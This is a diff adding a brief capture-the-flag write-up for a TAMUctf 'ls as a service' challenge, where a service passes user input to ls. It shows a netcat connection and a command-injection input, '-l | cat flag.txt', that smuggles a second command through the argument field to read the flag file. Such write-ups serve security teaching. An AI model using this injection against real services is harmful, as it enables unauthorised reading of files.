@@ -1,0 +1,20 @@
+nc pwn.tamuctf.com 4324
+
+once connected you can pass commands to ls so if we ls -l we get
+
+ls as a service (laas)(Copyright pending)
+Enter the arguments you would like to pass to ls:
+-l
+Result of ls -l:
+total 12
+-r--r--r-- 1 pwnflag pwnflag   23 Feb 19 17:28 flag.txt
+-rwsr-xr-x 1 pwnflag pwnflag 7504 Feb 19 17:28 pwn4
+ls as a service (laas)(Copyright pending)
+
+
+then we can pipe it into cat the flag.txt file which is sitting there
+
+Enter the arguments you would like to pass to ls:
+-l | cat flag.txt
+Result of ls -l | cat flag.txt:
+gigem{5y573m_0v3rfl0w}
